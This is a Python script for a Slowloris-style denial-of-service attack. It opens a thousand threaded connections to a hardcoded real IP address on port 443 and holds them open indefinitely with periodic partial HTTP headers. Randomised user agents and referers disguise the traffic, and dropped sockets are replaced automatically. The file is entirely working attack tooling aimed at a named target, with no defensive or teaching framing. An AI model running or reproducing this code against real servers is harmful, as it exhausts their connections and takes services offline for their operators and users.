# Libraries
import time
import random
from typing import Optional
from concurrent.futures import ThreadPoolExecutor

from utils.files import Files as fls
from utils.messages import Messages as msg
from core.slowsock import Slowsock

# Constants
CONNECTIONS_AMOUNT = 1000
THREADS_AMOUNT = 200
TARGET_ADDRESS = "92.222.117.57"
TARGET_PORT = 443
WAIT_TIME = 0.5
TIMEOUT = 15
USER_AGENTS = fls.read_file("files/user-agents.txt")
REFERERS = fls.read_file("files/referers.txt")


# Function to create a socket
def create_socket(*args) -> Optional[Slowsock]:
    try:
        socket = Slowsock(
            host=TARGET_ADDRESS,
            port=TARGET_PORT,
            timeout=TIMEOUT,
            path=f"/?{random.randint(0, 2000)}",
            user_agent=random.choice(USER_AGENTS),
            referer=random.choice(REFERERS),
        )
        socket.initiate_connection()
        return socket
    except Slowsock.TimeoutError:
        return None
    except Exception as error:
        msg.show_error(f"An unexpected error occurred while creating a socket: {error}")


# Function to close a socket
def close_socket(socket: Slowsock) -> None:
    socket.close_connection()


# Function to create a set of sockets
def create_socket_set(socket_amount: int) -> list[Slowsock]:
    with ThreadPoolExecutor(max_workers=THREADS_AMOUNT) as executor:
        created_sockets = executor.map(create_socket, range(socket_amount))

    # Return successful sockets
    return list(filter(None, created_sockets))


# Function to send data through a socket
def send_data(socket: Slowsock, socket_set: list[Slowsock]) -> None:
    header = f"X-a: {random.randint(1, 5000)}\r\n"
    socket.send_data(header)
    if socket.get_status() != 2:
        socket_set.remove(socket)
        close_socket(socket)


# Main function
if __name__ == "__main__":
    # Variables
    socket_set = []

    # Main loop
    try:
        # Create a set of sockets
        msg.show_info(f"Creating {CONNECTIONS_AMOUNT} connections...\n")
        socket_set = create_socket_set(CONNECTIONS_AMOUNT)

        # Maintain the connection alive
        msg.show_info("Ensuring each connection stays alive...\n")
        while True:
            # Try to send data through each socket
            msg.show_info("Sending data through each connection...")
            with ThreadPoolExecutor(max_workers=THREADS_AMOUNT) as executor:
                executor.map(send_data, socket_set)

            # Show a message
            msg.show_success("Data has been sent successfully.")

            # Create sockets if some have been closed
            required_amount = CONNECTIONS_AMOUNT - len(socket_set)
            if required_amount > 0:
                print("\n")
                msg.show_warning("Some sockets were lost.")
                msg.show_info(f"Creating {required_amount} sockets...")
                socket_set += create_socket_set(required_amount)

            # Wait for a while
            msg.show_info(f"Waiting {WAIT_TIME} seconds before continuing...\n")
            time.sleep(WAIT_TIME)
    except KeyboardInterrupt:
        # Close all connections
        msg.show_warning("Closing all connections...")
        with ThreadPoolExecutor(max_workers=THREADS_AMOUNT) as executor:
            executor.map(close_socket, socket_set)

        # Show a message
        msg.show_success("All connections have been closed successfully.")
    except Exception as error:
        msg.show_error(f"An unexpected error occurred: {error}")
